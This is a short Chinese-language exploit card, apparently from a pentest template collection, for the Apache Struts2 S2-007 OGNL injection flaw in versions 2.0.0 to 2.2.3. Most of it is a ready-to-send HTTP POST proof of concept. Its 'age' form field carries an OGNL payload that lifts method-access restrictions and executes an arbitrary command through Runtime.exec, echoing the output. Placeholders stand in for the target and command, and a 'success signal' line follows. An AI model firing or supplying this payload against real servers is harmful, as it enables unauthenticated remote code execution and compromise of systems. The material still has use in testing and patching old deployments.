# S2-007 OGNL 注入 RCE

## 指纹特征
- 服务: Apache Struts2 (2.0.0 - 2.2.3)
- 场景: validation.xml 类型转换错误

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 字段类型转换注入 | `*.action` (表单提交) | 无 |

## PoC 指令

在 validation 类型不匹配的字段中注入 Payload：

```http
POST /user.action HTTP/1.1
Host: {{TARGET}}:8080
Content-Type: application/x-www-form-urlencoded

age=' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false"),#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('{{COMMAND}}').getInputStream())) + '&name=test&email=test@test.com
```

## Success Signal
- **响应回显**: 响应页面内容包含注入的命令结果。
